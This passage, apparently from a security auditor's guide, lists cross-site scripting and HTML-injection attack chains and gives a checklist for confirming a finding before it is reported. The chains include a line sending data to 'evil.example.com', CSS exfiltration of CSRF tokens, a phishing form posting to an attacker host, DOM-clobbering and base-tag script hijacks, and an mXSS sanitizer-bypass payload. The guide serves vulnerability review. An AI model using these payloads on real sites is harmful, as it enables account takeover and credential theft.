   `new Image().src = '//evil.example.com/?d=' + btoa(data)` (works even with HttpOnly cookies).
4. **HTML injection → CSS exfiltration → CSRF-token theft → ATO.** Inject `<style>` attribute selectors
   → leak the token char-by-char to `evil.example.com` → use it for state-changing actions (no JS).
5. **HTML injection → form injection → credential phishing.** Inject `<form
   action=//attacker.example.com>` with a fake login UI inside trusted chrome → victim submits creds.
6. **DOM clobbering → script-source override → full XSS.** Inject `<a id=config
   href=//attacker.example.com/p.js>` → existing `window.config`-driven loader fetches attacker JS.
7. **Base-tag injection → relative-script hijack → full XSS.** Inject `<base
   href=//attacker.example.com/>` → all relative `<script src="/app.js">` load from the attacker.
8. **mXSS → sanitizer bypass → stored XSS → ATO.** `<math><mi><table><mglyph><style><img src=x
   onerror=...>` survives the server sanitizer, mutates in the browser parser, executes → chain to (1)/(2).

---

## Confirmation gate (before reporting ANY row)

- [ ] Exact source→sink path with file:line; the payload renders UNESCAPED (not visible text).
- [ ] JS executes, OR HTML injection has a demonstrated non-script impact (phishing/CSS-exfil/clobber).
- [ ] Affects OTHER users (not self-XSS only).
- [ ] CSP does not block it, OR a concrete bypass (Reference C) is identified.
- [ ] Output context matches the payload; encoder does NOT match the context (that's the bug).
- [ ] Upstream defense that would clear it (contextual auto-escape / tight sanitizer allowlist / CSP with
      per-request nonce + `base-uri`/`object-src`/`form-action` / `nosniff`+attachment) is ABSENT on this path.
- [ ] All render surfaces checked (web / REST / GraphQL / mobile / email / preview — XSS-50).
